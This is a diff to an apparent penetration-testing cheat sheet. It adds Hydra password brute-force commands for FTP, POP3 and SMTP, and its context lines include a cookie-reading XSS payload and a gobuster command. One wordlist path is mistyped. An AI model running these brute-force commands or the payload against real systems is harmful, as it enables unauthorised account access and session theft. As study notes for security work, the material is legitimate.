@@ -16,6 +16,7 @@
 - [Cewl](#cewl) - It is use to create a worldlist using website link
 - [netcat](#nc)
 - [Cross-Site Scripting](#xxs)
+- [Brute-force attack](#bruteforce)
 
 
 # Enumeration
@@ -148,5 +149,18 @@ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://192.168.54.84 -t 100
 <img src="" onerror=alert(document.cookie)>
 ```
 
-
-
+- ## Brute-force attack <a name="bruteforce"></a>
+### Hydra FTP Brute Force
+```
+hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 
+127.0.0.1 ftp -V
+```
+### Hydra POP3 Brute Force
+```
+hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 
+127.0.0.1 pop3 -V
+```
+### Hydra SMTP Brute Force
+```
+hydra -P /usr/share/wordlistsnmap.lst 127.0.0.1 smtp -V
+```
